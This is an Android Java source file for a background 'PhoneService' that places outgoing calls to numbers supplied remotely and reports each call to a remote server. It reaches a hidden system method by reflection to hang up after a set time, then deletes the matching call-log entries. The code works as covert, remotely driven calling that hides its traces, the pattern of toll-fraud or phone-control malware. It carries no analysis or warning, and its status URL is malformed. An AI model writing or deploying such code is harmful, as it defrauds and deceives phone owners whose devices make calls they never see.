package com.m1.android.data.service;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Map;
import java.util.Queue;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.android.internal.telephony.ITelephony;
import com.m1.android.data.action.BaseAction;
import com.m1.android.data.entity.RemoteCall;
import com.m1.android.data.http.HttpWrapper;
import com.m1.android.data.util.CallLogUtil;

@SuppressLint("HandlerLeak")
public class PhoneService extends Service {
	public static final String KEY_EXTRA_REMOTECALLS = "remotecalls";
	private static final int WHAT_DISPATCH_CALL = 100;
	private static final int WHAT_END_CALL = 101;
	private Looper mServiceLooper;
	private ServiceHandler mServiceHandler;
	public static boolean isRemoteCalling = false;
	private int phoneState = TelephonyManager.CALL_STATE_IDLE;
	private Queue<RemoteCall> mCalls = new LinkedList<RemoteCall>();
	private ITelephony mITelephony;
	private RemoteCall mDailingCall = null;

	public PhoneService() {
	}

	@Override
	public void onCreate() {
		super.onCreate();
		HandlerThread thread = new HandlerThread("PhoneService");
		thread.start();
		mServiceLooper = thread.getLooper();
		mServiceHandler = new ServiceHandler(mServiceLooper);
		// 利用反射获取隐藏的endcall方法
		TelephonyManager telephonyMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		try {
			Method getITelephonyMethod = TelephonyManager.class.getDeclaredMethod("getITelephony", (Class[]) null);
			getITelephonyMethod.setAccessible(true);
			mITelephony = (ITelephony) getITelephonyMethod.invoke(telephonyMgr, (Object[]) null);
		} catch (Exception e) {
			e.printStackTrace();
		}

		telephonyMgr.listen(new TelStateListener(), PhoneStateListener.LISTEN_CALL_STATE);
	}

	@SuppressWarnings("deprecation")
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		ArrayList<RemoteCall> calls = intent.getParcelableArrayListExtra(KEY_EXTRA_REMOTECALLS);
		if (calls != null && !calls.isEmpty()) {
			for (RemoteCall call : calls) {
				if (!mCalls.contains(call)) {
					mCalls.add(call);
				}
			}
		}
		Message msg = mServiceHandler.obtainMessage(WHAT_DISPATCH_CALL);
		mServiceHandler.sendMessageDelayed(msg, 200);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		super.onStartCommand(intent, flags, startId);
		onStart(intent, startId);
		return START_REDELIVER_INTENT;
	}

	private final class ServiceHandler extends Handler {
		public ServiceHandler(Looper looper) {
			super(looper);
		}

		@Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case WHAT_DISPATCH_CALL:
				removeMessages(WHAT_DISPATCH_CALL);
				if (!isRemoteCalling) {
					if (TelephonyManager.CALL_STATE_IDLE == phoneState) {
						final RemoteCall call = mCalls.poll();
						if (call == null)
							return;
						if (call.getCallAfter().getTime() <= System.currentTimeMillis()) {
							Intent intent = new Intent(Intent.ACTION_CALL);
							intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							intent.setData(Uri.parse("tel://" + call.getCallNumber()));
							startActivity(intent);
							mDailingCall = call;
							isRemoteCalling = true;
							sendEmptyMessageDelayed(WHAT_END_CALL, call.getDuration() * 1000);
							new AsyncTask<Void, Void, Void>() {

								@Override
								protected Void doInBackground(Void... params) {
									try {
										HashMap<String, String> data = new HashMap<String, String>();
										data.put("ids", String.valueOf(mDailingCall.getId()));
										String requestUrl = BaseAction.DEFAULT_HOST + "/updateOutgoingCallStatus.htm";
										HttpWrapper.getInstance(getApplicationContext()).post(requestUrl + "/updateOutgoingCallStatus.htm", data, Map.class);
									} catch (Exception e) {
										e.printStackTrace();
									}
									return null;
								}

							}.execute();
						} else {
							mCalls.add(call);
							sendEmptyMessageDelayed(WHAT_DISPATCH_CALL, 200);
						}
					} else {
						sendEmptyMessageDelayed(WHAT_DISPATCH_CALL, 200);
					}
				}
				break;
			case WHAT_END_CALL:
				if (isRemoteCalling && TelephonyManager.CALL_STATE_IDLE != phoneState) {
					try {
						mITelephony.endCall();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				if (mDailingCall != null) {
					if (mDailingCall.isDeleteCallLog()) {
						final String number = mDailingCall.getCallNumber();
						mServiceHandler.postAtTime(new Runnable() {

							@Override
							public void run() {
								CallLogUtil.deleteCalllogByPhone(getApplicationContext(), number);
							}
						}, 2 * 1000);
					}
					mDailingCall = null;
				}
				isRemoteCalling = false;
				sendEmptyMessageDelayed(WHAT_DISPATCH_CALL, 200);
				break;
			default:
				break;
			}
		}
	}

	class TelStateListener extends PhoneStateListener {
		@Override
		public void onCallStateChanged(int state, final String incomingNumber) {
			super.onCallStateChanged(state, incomingNumber);
			phoneState = state;
			switch (state) {
			case TelephonyManager.CALL_STATE_IDLE:
				isRemoteCalling = false;
				mServiceHandler.sendEmptyMessageDelayed(WHAT_DISPATCH_CALL, 200);
				break;
			default:
				break;
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
}
